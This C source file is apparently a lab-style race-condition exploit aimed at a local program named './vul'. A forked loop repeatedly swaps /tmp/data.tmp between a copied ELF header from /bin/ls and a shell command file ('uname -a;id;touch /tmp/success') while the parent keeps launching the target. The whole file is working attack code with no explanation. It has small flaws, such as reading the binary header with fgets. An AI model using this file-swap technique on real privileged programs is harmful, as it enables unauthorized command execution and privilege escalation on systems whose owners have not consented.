/*


  
*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#define TEST_FILE	"/tmp/data.tmp"

char elf_header[512];


int make_command_file(char *filename)
{
  FILE *fp;
  int i;
    
  fp = fopen(TEST_FILE,"w+");
  fputs("uname -a;id;touch /tmp/success", fp);
  fclose(fp);
}


int make_elf_file(char *filename)
{
  FILE *fp;
  int i;
    
  fp = fopen(TEST_FILE,"w+");
  for(i = 0; i < sizeof(elf_header); i++)
    fputc(elf_header[i], fp);
  fclose(fp);
}

void main(int argc, char *argv[]) {

  FILE *fp;
  int i;  
  int max = 100;
  fp = fopen("/bin/ls", "r");
  fgets(elf_header, 512, fp);
  fclose(fp);
  if (argc > 1)
    max = atoi(argv[1]);
    
  printf("[+] read ELF hreader done\n");


  if (fork()) {
    for(i = 0; i < max; i++)
    {
      system("./vul");
    }
  } else {
    for(i = 0; i < max; i++)
    {
      unlink(TEST_FILE);
      make_elf_file(TEST_FILE);
      sleep(1);
      make_command_file(TEST_FILE);
    }
  }
}
